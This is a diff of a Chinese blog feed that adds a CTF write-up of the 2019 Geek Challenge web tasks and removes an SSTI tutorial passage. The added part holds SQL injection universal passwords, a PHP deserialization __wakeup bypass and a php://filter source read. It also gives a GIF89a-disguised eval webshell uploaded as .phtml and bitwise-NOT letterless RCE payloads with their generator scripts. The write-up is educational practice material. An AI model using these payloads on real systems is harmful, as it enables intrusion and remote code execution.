-<p>这是twig引擎的一个render方法，用于渲染模板并返回渲染结果</p>
-<p>$_GET[‘custom_email’]</p>
-<p>通过GET获取通过URL参数中名为custom_email的值</p>
-<p><code>array(&quot;first_name&quot; =&gt; $user-&gt;first_name)</code></p>
-<p>关联数组，前者是变量名，后面的$user-&gt;first_name是传递给模板的变量值，表示用户的名字</p>
-<p>从这段代码中，是可以看到有存在XSS漏洞的，但如果我们仔细观察可以发现这里有由于代码不规范而存在着ssti漏洞，此时我们验证一下</p>
-<p>假设我们的url&#x2F;?custom_email&#x3D;100</p>
-<p>那么将会返回100</p>
-<p>那我们继续url&#x2F;?custom_email&#x3D;</p>
-<p>返回f<templatereference none=""></templatereference></p>
-<p>可以看出来，我们在括号中的代码被执行了，服务器将我们的数据经过引擎解析的时候进行了执行，使用模板注入和sql注入的成因很像，都是由于管理员信任用户输入，对用户的输入没有进行合理的过滤而导致用户输入恶意代码进行了解析执行</p>
-<p>接下来我们来讲重点了</p>
-<h1 id="0x03Flask"><a href="#0x03Flask" class="headerlink" title="0x03Flask"></a>0x03Flask</h1><h2 id="flask的安装"><a href="#flask的安装" class="headerlink" title="flask的安装"></a>flask的安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br><span class="line"></span><br><span class="line">注意:在运行flask 的项目框架时候记得把app.py和flask扩展包放在同一路径下</span><br></pre></td></tr></table></figure>
+<p>输出处理的反序列化字符串是:<br><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125; </code></p>
+<p>为了避免触发wakeup魔术方法，我们还需要绕过方法</p>
+<h3 id="绕过wakeup方法其一"><a href="#绕过wakeup方法其一" class="headerlink" title="绕过wakeup方法其一"></a>绕过wakeup方法其一</h3><p>当目标类的成员属性个数大于实际个数的时候，可以绕过wakeup魔术方法，我们把反序列化字符串改一下</p>
+<p><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125; </code></p>
+<p>然后在属性那加上%00(因为成员属性类型是private，详细可以参考三种不同属性的序列化后字符串的格式)</p>
+<p><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</code></p>
+<p>传入参数就可以拿到flag了</p>
+<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>打开是一个登录界面</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111154133618-1731310894787-7.png" alt="image-20241111154133618"></p>
+<p>1和1试一下</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111154205265-1731310926448-9.png" alt="image-20241111154205265"></p>
+<h3 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h3><p>用单引号闭合试试看看是否存在注入</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111154338754-1731311019919-11.png" alt="image-20241111154338754"></p>
+<p>如果页面报错，且报错信息中包含SQL语法错误或未闭合的引号等，则可能是SQL注入点，说明存在注入</p>
+<h3 id="2-利用万能密码闭合"><a href="#2-利用万能密码闭合" class="headerlink" title="2.利用万能密码闭合"></a>2.利用万能密码闭合</h3><p>试一下万能密码</p>
+<p>1’ or ‘1’&#x3D;’1’#</p>
+<p>发现flag出来了，说明万能密码是可以做的</p>
+<p>首先学习一下sql语句逻辑运算符的优先级，由于SQL语句中逻辑运算符的优先级（&#x3D;优先于AND，AND优先于OR），以及字符串拼接的特性，上述SQL语句实际上会被解析为两部分：</p>
+<p>SELECT*FROM table_name WHERE username&#x3D;’1’ or ‘1’&#x3D;’1’#’;and password&#x3D;’1’ </p>
+<p>其中，1&#x3D;1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。这导致无论密码是什么，只要用户名是万能密码，用户都能通过验证。</p>
+<p>输入后成功获取flag，但很多题目中往往用万能密码行不通，所以最好还是学习一下手动注入或利用sqlmap进行自动注入。</p>
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>题目界面是一样的，但可以看到作者对网站进行了一定的加固</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111155420887-1731311661949-13.png" alt="image-20241111155420887"></p>
+<p>常规做法，先试一下万能密码</p>
+<p>1’ or 1&#x3D;1#</p>
+<p>发现or不见了，猜测是被过滤了，</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111190347533-1731323029026-47.png" alt="image-20241111190347533"></p>
+<p>可以再试试order，发现最后只剩der了，可以确定是被过滤了</p>
+<p>试一下双写绕过，发现可以绕过,但后面测试的时候发现联合注入和堆叠注入都不能做</p>
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开页面</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173046086-1731317448508-15.png" alt="image-20241111173046086"></p>
+<p>查看页面源代码发现一段隐藏代码</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173328803-1731317611677-17.png" alt="image-20241111173328803">****</p>
+<p>是源码泄露，直接get传入cat&#x3D;dog就可以拿到flag了</p>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>查看题目</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111173758449-1731317879848-19.png" alt="image-20241111173758449"></p>
+<p>看看源代码有没有可用的信息</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175056679-1731318658497-21.png" alt="image-20241111175056679"></p>
+<p>发现一个Archive_room.php</p>
+<p>访问看看</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175119374-1731318681097-23.png" alt="image-20241111175119374"></p>
+<p>有一个按钮链接，点一下就跳转结束了</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175201233-1731318722812-25.png" alt="image-20241111175201233"></p>
+<p>那就抓包再send一次试试</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175315956-1731318797510-27.png" alt="image-20241111175315956"></p>
+<p>看到了一个被注释掉的secr3t.php</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111175355811-1731318837374-29.png" alt="image-20241111175355811"></p>
+<p>是include()包含rce代码执行</p>
+<h3 id="include-函数"><a href="#include-函数" class="headerlink" title="include()函数"></a>include()函数</h3><p><strong>include就是包含文件的函数，把$file的内容包含进来.</strong></p>
+<p><strong>include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来</strong></p>
+<h3 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h3><ul>
+<li><code>strstr</code> 函数用于查找一个字符串在另一个字符串中的首次出现。如果找到了，它会返回从匹配位置到字符串末尾的部分；如果没有找到，则返回 <code>false</code>。<code>strstr</code> 是区分大小写的。</li>
+</ul>
+<h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">strstr</span> ( <span class="keyword">string</span> <span class="variable">$haystack</span> , <span class="keyword">string</span> <span class="variable">$needle</span> [, <span class="keyword">bool</span> <span class="variable">$before_needle</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure>
 
+<ol>
+<li>**<code>$haystack</code>**：要搜索的字符串，即干草堆。</li>
+<li>**<code>$needle</code>**：要查找的子字符串，即针。</li>
+<li>**<code>$before_needle</code>**（可选）：如果设置为 <code>true</code>，则返回 <code>$needle</code> 出现之前的部分；如果未设置或设置为 <code>false</code>，则返回从 <code>$needle</code> 出现的位置开始到 <code>$haystack</code> 末尾的部分。</li>
+</ol>
+<p>解析代码:<br>if(strstr($file,”..&#x2F;“)||stristr($file, “tp”)||stristr($file,”input”)||stristr($file,”data”))</p>
+<ul>
+<li>**<code>strstr($file, &quot;../&quot;)</code>**：<ul>
+<li>这一条件用于检查 <code>$file</code> 是否包含 <code>../</code>，这通常意味着用户尝试进行路径遍历攻击，试图访问文件系统中的父级目录。</li>
+</ul>
+</li>
+<li>**<code>stristr($file, &quot;tp&quot;)</code><strong>、</strong><code>stristr($file, &quot;input&quot;)</code><strong>、</strong><code>stristr($file, &quot;data&quot;)</code>**：<ul>
+<li>这些条件检查 <code>$file</code> 是否包含子字符串 <code>&quot;tp&quot;</code>、<code>&quot;input&quot;</code> 或 <code>&quot;data&quot;</code>。这些子字符串可能是根据应用程序的上下文来判断的，通常用来避免某些类型的访问或不当的数据输入。</li>
+</ul>
+</li>
+</ul>
+<p>解法:</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议:"></a><strong>伪协议:</strong></h4><p><strong>php:&#x2F;&#x2F; 协议：</strong></p>
+<p>​	条件 allow_url_include :仅php:&#x2F;&#x2F;input   php:&#x2F;&#x2F;stdin   php:&#x2F;&#x2F;memory   php:&#x2F;&#x2F;temp 需要on allow_url_fopen:off&#x2F;on</p>
+<p>​	作用：php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input，php:&#x2F;&#x2F;filter用于读取源码，	php:&#x2F;&#x2F;input用于执行php代码</p>
+<p>​	php:&#x2F;&#x2F;filter参数详解：resource&#x3D;（必选，指定了你要筛选过滤的数据流）     read&#x3D;（可选）    write&#x3D;（可选）</p>
+<p>​	对read和write，可选过滤器有string.rot13、string.toupper、string.tolower、string.strip_tags、convert.base64-encode &amp; 		convert.base64-decode</p>
+<p>​		用法举例：<strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p>
+<p>php:&#x2F;&#x2F;是一种协议名称，php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议， &#x2F;read&#x3D;convert.base64-encode&#x2F;表示读取的方式是base64编码后， resource&#x3D;flag.php表示目标文件为flag.php。</p>
+<p>解题:</p>
+<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>然后会返回base64编码的字符串，解码一下就可以看到flag了</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111180542885-1731319544378-31.png" alt="image-20241111180542885"></p>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开题目就看到了一句话木马</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111181358741-1731320040380-33.png" alt="image-20241111181358741"></p>
+<p>但因为我们不确定这个一句话木马是不是写在这个网站下</p>
+<p>先看看源码</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111181515797-1731320116909-35.png" alt="image-20241111181515797"></p>
+<p>查看源码发现一句话木马是写在当前网站下的</p>
+<p>那就直接用蚁剑连，密码就是Syc</p>
+<p>(其实我个人理解蚁剑就是一个自动的rce工具，密码就是传入rce的参数，蚁剑可以通过这个参数执行命令获取目录以及文件内容，并整合起立返回给我们)</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111183058737-1731321059960-37.png" alt="image-20241111183058737"></p>
+<p>黑盒测试的文件上传漏洞</p>
+<p>先传一个一句话木马文件试试，发现有文件类型限制</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111183232544-1731321153685-39.png" alt="image-20241111183232544"></p>
+<p>抓包修改文件后缀判断一下是不是前端验证，然后发现</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185030775-1731322231946-41.png" alt="image-20241111185030775"></p>
+<p>可见是对文件后缀过滤了php，那就试试phtml后缀</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185201905-1731322322914-43.png" alt="image-20241111185201905"></p>
+<p>绕过文件后缀验证了，但也对文件内容进行了检查</p>
+<p>那就直接用phtml一句话木马去做吧</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传上去然后修改了conten头，但还是被警告了得上传图片</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111185556170-1731322557379-45.png" alt="image-20241111185556170"></p>
+<p>那就伪造一下jpg格式</p>
+<h3 id="GIF89a伪造jpg格式文件"><a href="#GIF89a伪造jpg格式文件" class="headerlink" title="GIF89a伪造jpg格式文件"></a>GIF89a伪造jpg格式文件</h3><p>前面加上GIF89a，这个可以伪造成jpg格式的文件。</p>
+<p>上传后显示上传成功，猜测是在&#x2F;upload路径下</p>
+<p>于是访问&#x2F;upload&#x2F;1.phtml，成功后用蚁剑进行连接，就可以找到flag</p>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>打开题目，在menu里面找到flag的有关网站</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111193758763-1731325079995-49.png" alt="image-20241111193758763"></p>
+<p>看到需要验证学生的身份，猜测是cookie有关的，那就先抓包看看</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111193841804-1731325122814-51.png" alt="image-20241111193841804"></p>
+<p>看到隐藏代码，意思是我们需要post传入两个参数，money的值根据页面来说我们需要100000000money才能买flag，password的话需要绕过验证且值为404，可以看到这里是弱比较，所以404a或者404abc都能通过验证，那就传参吧(记得修改请求包，改成post请求包)</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111194130278-1731325291368-53.png" alt="image-20241111194130278"></p>
+<p>可以看到我们是成功通过验证了，但显示需要学生的身份，这时候我们可以注意到cookie有一个参数user等于0，cookie通常被用作身份验证，猜测把user改成1就行了，因为0表示false，1表示true</p>
+<p><strong>这边显示密码正确，身份验证也对了，但是money错误，怀疑是长度问题。（you have not enough money,loser~）</strong></p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111194400685.png" alt="image-20241111194400685"></p>
+<p>试着把money改成数组形式或者用科学计数法试试看</p>
+<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">         <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>rce代码执行</p>
+<p>审代码</p>
+<p>我们通过get传入一个参数code，这个参数必须满足以下条件</p>
+<ul>
+<li><p>code参数的字符串长度不能大于40</p>
+</li>
+<li><p>绕过preg_match正则匹配的字符</p>
+</li>
+</ul>
+<p>preg_match(“&#x2F;[A-Za-z0-9]+&#x2F;“,$code</p>
+<ul>
+<li>**<code>A-Za-z0-9]</code>**：表示字符集，匹配任意一个字母（大写或小写）或数字。</li>
+<li>**<code>+</code>**：表示前面的字符集可以出现一次或多次。</li>
+</ul>
+<p>这就是很经典的无字母无数字rce</p>
+<p>可参考的做法就是用异或，取反，自增（这里限制了长度，所以自增不可以）进行构造payload</p>
+<p>我这里直接用取反方法给payload了，方法的话直接参考这三种方法构造payload就行</p>
+<p>payload:</p>
+<p>取反脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$e</span>=~(<span class="variable">$d</span>);</span><br><span class="line"><span class="comment">// if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$e))&#123;</span></span><br><span class="line"><span class="comment">//     echo 0;</span></span><br><span class="line"><span class="comment">// &#125;else &#123;</span></span><br><span class="line"><span class="comment">//     echo 1;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>url/?code=(~%8F%97%8F%96%91%99%90)();</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disable_functions:</span><br><span class="line"></span><br><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>
+
+<p>这么多函数都被禁用了，我们想办法代入<code>antsword</code>处理</p>
+<p>先看一下php的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP Version 7.0.33`在7.2之前，构造`assert(eval($_POST[a]));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;eval($_POST[a])&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传后进行访问，用蚁剑进行连接，但发现readflag无法读取，权限设置也读不了，这时候可以用蚁剑的插件</p>
+<p><img src="/./../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image-20241111204701806-1731329222948-55.png" alt="image-20241111204701806"></p>
 ]]></content>
       <categories>
-        <category>ssti</category>
+        <category>赛题wp</category>
       </categories>
       <tags>
         <tag>web安全</tag>
